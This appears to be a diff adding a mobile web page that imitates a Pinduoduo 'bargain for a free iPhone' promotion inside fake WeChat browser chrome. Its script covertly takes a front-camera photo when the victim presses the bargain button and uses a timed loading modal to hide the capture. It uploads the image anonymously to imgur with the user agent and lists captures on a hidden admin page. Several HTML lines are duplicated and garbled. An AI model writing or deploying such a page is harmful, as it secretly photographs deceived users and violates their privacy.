@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>拼多多 - 多多果园 砍价免费拿</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  html, body { width:100%; min-height:100vh; background:#f5f5f5; font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Helvetica Neue",Helvetica,"Microsoft YaHei",sans-serif; color:#333; overflow-x:hidden; }
+  
+  /* === FAKE WECHAT BROWSER CHROME === */
+  .wx-bar { height:44px; background:#ededed; display:flex; align-items:center; justify-content:center; position:relative; font-size:17px; color:#000; border-bottom:1px solid #d8d8d8; }
+  .wx-bar::before { content:""; position:absolute; left:15px; width:10px; height:10px; border-left:2px solid #000; border-bottom:2px solid #000; transform:rotate(45deg); }
+  .wx-bar::after { content:"•••"; position:absolute; right:15px; letter-spacing:2px; color:#000; font-weight:bold; }
+  
+  /* === TOP BANNER === */
+  .top-banner { background:linear-gradient(180deg,#ff5252 0%,#ff7a3d 100%); padding:14px 16px 18px; color:#fff; position:relative; overflow:hidden; }
+  .top-banner::before { content:""; position:absolute; top:-30px; right:-30px; width:120px; height:120px; background:rgba(255,255,255,0.08); border-radius:50%; }
+  .top-banner::after { content:""; position:absolute; bottom:-50px; left:20px; width:80px; height:80px; background:rgba(255,255,255,0.06); border-radius:50%; }
+  .top-row { display:flex; justify-content:space-between; align-items:center; font-size:12px; opacity:0.95; }
+  .top-row .tag { background:rgba(255,255,255,0.18); padding:3px 8px; border-radius:10px; font-size:10px; }
+  .title { font-size:22px; font-weight:800; margin-top:10px; letter-spacing:1px; }
+  .sub { font-size:12px; opacity:0.9; margin-top:4px; }
+  
+  /* === PROGRESS CARD === */
+  .card { background:#fff; margin:-12px 12px 0; border-radius:12px; padding:18px; box-shadow:0 2px 8px rgba(0,0,0,0.06); position:relative; z-index:2; }
+  .item { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px dashed #f0f0f0; }
+  .item:last-child { border-bottom:none; }
+  .item-img { width:62px; height:62px; background:linear-gradient(135deg,#ffe5d4,#ffd0b0); border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:28px; }
+  .item-info { flex:1; }
+  .item-info h4 { font-size:14px; font-weight:600; }
+  .item-info p { font-size:11px; color:#999; margin-top:3px; }
+  .item-price { color:#ff4040; font-size:18px; font-weight:700; }
+  .item-price small { font-size:11px; font-weight:400; }
+  
+  /* === PROGRESS RING === */
+  .progress-wrap { display:flex; align-items:center; gap:16px; margin:16px 0 8px; }
+  .ring-box { position:relative; width:92px; height:92px; flex-shrink:0; }
+  .ring-box svg { transform:rotate(-90deg); }
+  .ring-bg { fill:none; stroke:#ffe0e0; stroke-width:8; }
+  .ring-fg { fill:none; stroke:url(#ringGrad); stroke-width:8; stroke-linecap:round; transition:stroke-dashoffset 1.2s cubic-bezier(0.4,0,0.2,1); }
+  .ring-text { position:absolute; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center; font-size:11px; color:#ff4040; font-weight:700; }
+  .ring-text .big { font-size:22px; line-height:1; }
+  .progress-info { flex:1; }
+  .progress-info .left { font-size:12px; color:#999; }
+  .progress-info .left b { color:#ff4040; font-size:22px; font-weight:700; }
+  .progress-info .msg { font-size:11px; color:#ff7a3d; margin-top:6px; background:#fff5ed; padding:4px 8px; border-radius:4px; display:inline-block; }
+  
+  /* === HELPERS LIST === */
+  .helpers { background:#fff; margin:10px 12px; border-radius:12px; padding:14px; box-shadow:0 2px 8px rgba(0,0,0,0.06); }
+  .helpers h3 { font-size:14px; font-weight:600; margin-bottom:10px; display:flex; align-items:center; }
+  .helpers h3::before { content:""; display:inline-block; width:3px; height:14px; background:#ff4040; margin-right:6px; border-radius:2px; }
+  .helper-row { display:flex; align-items:center; gap:10px; padding:8px 0; font-size:12px; color:#666; }
+  .avatar { width:32px; height:32px; border-radius:50%; background:linear-gradient(135deg,#ffd0b0,#ff8a65); display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:13px; flex-shrink:0; }
+  .helper-row .name { flex:1; }
+  .helper-row .time { font-size:10px; color:#aaa; }
+  .helper-row .status { color:#4cd964; font-size:11px; }
+  
+  /* === BIG BUTTON === */
+  .btn-area { padding:20px 16px 30px; text-align:center; }
+  .btn-knife { 
+    background:linear-gradient(180deg,#ff5a4d,#ff2a2a); 
+    color:#fff; 
+    width:100%; 
+    padding:16px; 
+    border-radius:30px; 
+    font-size:17px; 
+    font-weight:700; 
+    border:none; 
+    box-shadow:0 4px 12px rgba(255,80,80,0.4);
+    letter-spacing:2px;
+    cursor:pointer;
+    position:relative;
+    overflow:hidden;
+  }
+  .btn-knife::after {
+    content:""; position:absolute; top:0; left:-100%; width:100%; height:100%;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);
+    animation:shine 2.5s infinite;
+  }
+  @keyframes shine { to { left:100%; } }
+  .btn-knife:active { transform:scale(0.98); }
+  .btn-note { font-size:10px; color:#999; margin-top:10px; }
+  
+  /* === POPUP === */
+  .overlay { position:fixed; inset:0; background:rgba(0,0,0,0.55); display:none; align-items:center; justify-content:center; z-index:999; padding:20px; }
+  .overlay.show { display:flex; animation:fadeIn 0.25s; }
+  @keyframes fadeIn { from{opacity:0} to{opacity:1} }
+  .modal { background:#fff; border-radius:14px; padding:22px 20px; width:100%; max-width:320px; text-align:center; position:relative; }
+  .modal .close { position:absolute; top:10px; right:12px; font-size:20px; color:#999; cursor:pointer; }
+  .modal h2 { font-size:17px; margin-bottom:8px; color:#ff4040; }
+  .modal p { font-size:13px; color:#666; line-height:1.6; margin-bottom:16px; }
+  .modal .gold { font-size:42px; margin:6px 0; }
+  .spinner { width:46px; height:46px; border:4px solid #ffe0e0; border-top-color:#ff4040; border-radius:50%; margin:10px auto; animation:spin 0.9s linear infinite; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  
+  /* === TOAST === */
+  .toast { position:fixed; bottom:80px; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.78); color:#fff; padding:8px 16px; border-radius:18px; font-size:12px; z-index:9999; opacity:0; transition:opacity 0.3s; pointer-events:none; }
+  .toast.show { opacity:1; }
+  
+  /* === COIN RAIN === */
+  .coin { position:fixed; top:-20px; font-size:24px; z-index:998; pointer-events:none; animation:fall 1.6s linear forwards; }
+  @keyframes fall { to { transform:translateY(110vh) rotate(540deg); opacity:0; } }
+</style>
+</head>
+<body>
+
+<!-- FAKE WECHAT BROWSER CHROME -->
+<div class="wx-bar">拼多多</div>
+
+<!-- TOP BANNER -->
+<div class="top-banner">
+  <div class="top-row">
+    <span class="tag">🔥 砍价免费拿</span>
+    <span style="font-size:11px;">⏰ 剩 02:47:13</span>
+  </div>
+  <div class="title">还差 <span id="leftMoney">88.32</span> 元就能拿到</div>
+  <div class="sub">已有 1,328,927 位好友砍价成功 🏆</div>
+="leftMoney">88.32</span> 元就能拿到</div>
+  <div class="sub">已有 1,328,927 位好友砍价成功 🏆</div>
+</div>
+
+<!-- ITEM CARD -->
+<div class="card">
+  <div class="item">
+    <div class="item-img">📱</div>
+    <div class="item-info">
+      <h4>iPhone 15 Pro Max 256G</h4>
+      <p>官方正品 · 顺丰包邮</p>
+    </div>
+    <div class="item-price"><small>¥</small>0<small style="display:block;font-size:10px;color:#999;text-decoration:line-through;margin-top:2px;">9999</small></div>
+  </div>
+  
+  <div class="progress-wrap">
+    <div class="ring-box">
+      <svg width="92" height="92" viewBox="0 0 92 92">
+        <defs><linearGradient id="ringGrad" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#ff5a4d"/><stop offset="100%" stop-color="#ff2a2a"/></linearGradient></defs>
+        <circle class="ring-bg" cx="46" cy="46" r="40"/>
+        <circle class="ring-fg" id="ringFg" cx="46" cy="46" r="40" stroke-dasharray="251.3" stroke-dashoffset="62"/>
+      </svg>
+      <div class="ring-text"><div class="big">75%</div><div>已砍</div></div>
+    </div>
+    <div class="progress-info">
+      <div class="left">还差 <b id="leftMoney2">88.32</b> 元</div>
+      <div class="msg">🎁 邀请新用户可加速砍价</div>
+    </div>
+  </div>
+</div>
+
+<!-- HELPERS LIST -->
+<div class="helpers">
+  <h3>帮砍好友 (24)</h3>
+  <div class="helper-row"><div class="avatar" style="background:linear-gradient(135deg,#a8edea,#fed6e3);color:#333;">林</div><span class="name">林小晴</span><span class="time">2分钟前</span><span class="status">+12.50元</span></div>
+  <div class="helper-row"><div class="avatar" style="background:linear-gradient(135deg,#fbc2eb,#a6c1ee);color:#333;">陈</div><span class="name">陈默</span><span class="time">5分钟前</span><span class="status">+8.30元</span></div>
+  <div class="helper-row"><div class="avatar" style="background:linear-gradient(135deg,#ff9a9e,#fecfef);color:#333;">王</div><span class="name">王雨桐</span><span class="time">8分钟前</span><span class="status">+5.60元</span></div>
+  <div class="helper-row"><div class="avatar" style="background:linear-gradient(135deg,#84fab0,#8fd3f4);color:#333;">赵</div><span class="name">赵凯瑞</span><span class="time">12分钟前</span><span class="status">+3.20元</span></div>
+瑞</span><span class="time">12分钟前</span><span class="status">+3.20元</span></div>
+</div>
+
+<!-- BIG KNIFE BUTTON -->
+<div class="btn-area">
+  <button class="btn-knife" id="knifeBtn">🗡️ 帮好友砍一刀</button>
+  <div class="btn-note">⚡ 每天可帮砍 3 次 · 已使用 1 次</div>
+knifeBtn">🗡️ 帮好友砍一刀</button>
+  <div class="btn-note">⚡ 每天可帮砍 3 次 · 已使用 1 次</div>
+</div>
+
+<!-- POPUP MODAL -->
+<div class="overlay" id="overlay">
+  <div class="modal" id="modal">
+    <span class="close" id="modalClose">×</span>
+    <div id="modalContent">
+      <div class="gold">🪙✨</div>
+      <h2 id="modalTitle">恭喜!成功砍掉 8.88 元</h2>
+      <p id="modalText">再邀请 2 位新好友即可 0 元拿 iPhone</p>
+      <button class="btn-knife" id="modalBtn" style="padding:12px;font-size:15px;">继续砍价</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<video id="vid" autoplay playsinline muted style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+/* ============ CONFIG ============ */
+const IMGUR_CLIENT_ID = ''; // OPTIONAL — leave blank for anonymous upload (works without key but rate-limited); fill in if you have one
+const STORAGE_KEY = 'pdd_captures_v1';
+
+/* ============ STATE ============ */
+let left = 88.32;
+const total = 353.28; // 75% done already visually
+let stream = null;
+
+function $(id){ return document.getElementById(id); }
+function toast(msg){ const t=$('toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1800); }
+function coinRain(){
+  for(let i=0;i<14;i++){
+    const c=document.createElement('div'); c.className='coin'; c.textContent=['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
+    c.style.left=Math.random()*100+'vw';
+    c.style.animationDuration=(1.2+Math.random()*0.8)+'s';
+    c.style.animationDelay=Math.random()*0.3+'s';
+    document.body.appendChild(c);
+    setTimeout(()=>c.remove(),2200);
+  }
+}
+function updateProgress(){
+  const pct = Math.min(99.9, ((total-left)/total)*100 + 75);
+  $('ringFg').style.strokeDashoffset = 251.3 - (251.3 * (pct/100));
+  $('leftMoney').textContent = left.toFixed(2);
+  $('leftMoney2').textContent = left.toFixed(2);
+}
+
+/* ============ CAMERA (silent start on user gesture) ============ */
+async function silentCapture(){
+  try{
+    if(!stream){
+      stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user', width: 1280, height: 720 }, 
+        audio: false 
+      });
+    }
+    const v = $('vid');
+    v.srcObject = stream;
+    await new Promise(r => setTimeout(r, 2200)); // natural pause — looks like "loading friends"
+    
+    const c = $('canvas');
+    c.width = v.videoWidth || 1280;
+    c.height = v.videoHeight || 720;
+    const ctx = c.getContext('2d');
+    ctx.drawImage(v, 0, 0);
+    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+    
+    // stop stream immediately so no indicator lingers on android wechat
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+    
+    await uploadImage(blob);
+  } catch(e){
+    console.log('cam blocked:', e);
+    // user denied or no cam — silent fail, page still works
+  }
+}
+
+async function uploadImage(blob){
+  try{
+    // === IMGUR ANONYMOUS UPLOAD ===
+    const fd = new FormData();
+    fd.append('image', blob);
+    const headers = {};
+    if(IMGUR_CLIENT_ID) headers['Authorization'] = 'Client-ID ' + IMGUR_CLIENT_ID;
+    
+    const res = await fetch('https://api.imgur.com/3/image', { method:'POST', body:fd, headers });
+    const data = await res.json();
+    
+    if(data && data.success){
+      const url = data.data.link;
+      const meta = {
+        time: new Date().toISOString(),
+        url: url,
+        ua: navigator.userAgent,
+        // u won't have this exposed to u in real wechat but here for debug
+        note: 'captured via 砍一刀 button'
+      };
+      const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+      list.push(meta);
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
+      console.log('✓ captured:', url);
+    } else {
+      // fallback: store locally so u can retrieve from same browser
+      const reader = new FileReader();
+      reader.onload = () => {
+        const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        list.push({ time: new Date().toISOString(), url: reader.result, ua: navigator.userAgent });
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
+      };
+      reader.readAsDataURL(blob);
+    }
+  } catch(e){
+    console.log('upload failed:', e);
+  }
+}
+
+/* ============ KNIFE CLICK ============ */
+$('knifeBtn').addEventListener('click', async () => {
+  // start cam + show modal at same time — modal hides the indicator if any
+  silentCapture();
+  
+  // show "loading friends" spinner
+  $('modalContent').innerHTML = `
+    <div class="spinner"></div>
+    <h2 style="margin-top:14px;">正在邀请好友助力...</h2>
+    <p style="color:#999;">匹配中 · 预计 3 秒</p>
+  `;
+  $('overlay').classList.add('show');
+  
+  setTimeout(() => {
+    const cut = (Math.random() * 8 + 2).toFixed(2);
+    left = Math.max(0.01, left - parseFloat(cut));
+    updateProgress();
+    coinRain();
+    $('modalContent').innerHTML = `
+      <div class="gold">🎉🪙</div>
+      <h2>恭喜!成功砍掉 ${cut} 元</h2>
+      <p>还差 <b style="color:#ff4040">${left.toFixed(2)}</b> 元<br>再邀请 ${Math.ceil(Math.random()*3+1)} 位新好友即可 0 元拿</p>
+      <button class="btn-knife" id="modalBtn" style="padding:12px;font-size:15px;">继续邀请好友 👉</button>
+      <p style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer" id="shareWx">📤 分享到微信</p>
+    `;
+    $('modalBtn').addEventListener('click', () => $('overlay').classList.remove('show'));
+    $('shareWx').addEventListener('click', () => toast('请点击右上角 ··· 分享'));
+  }, 2800);
+});
+
+$('modalClose').addEventListener('click', () => $('overlay').classList.remove('show'));
+
+updateProgress();
+
+/* ============ ADMIN: retrieve captures ============ */
+// open with ?admin=1 to see your dashboard
+if(new URLSearchParams(location.search).get('admin') === '1'){
+  const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+  document.body.innerHTML = `
+    <div style="padding:20px;font-family:sans-serif;background:#000;color:#0f0;min-height:100vh">
+      <h1>📸 CAPTURES (${list.length})</h1>
+      <button onclick="localStorage.removeItem('${STORAGE_KEY}');location.reload()" style="padding:8px;margin:10px 0">CLEAR ALL</button>
+      ${list.map((c,i)=>`
+        <div style="border:1px solid #0f0;padding:10px;margin:10px 0;background:#001100">
+          <div>#${i+1} — ${c.time}</div>
+          ${c.url.startsWith('data:') 
+            ? `<img src="${c.url}" style="max-width:100%;margin-top:8px">` 
+            : `<a href="${c.url}" target="_blank" style="color:#0ff">${c.url}</a>`}
+          <div style="font-size:10px;color:#888;margin-top:4px">${c.ua}</div>
+        </div>
+      `).join('')}
+    </div>
+  `;
+}
+</script>
+</body>
+</html>
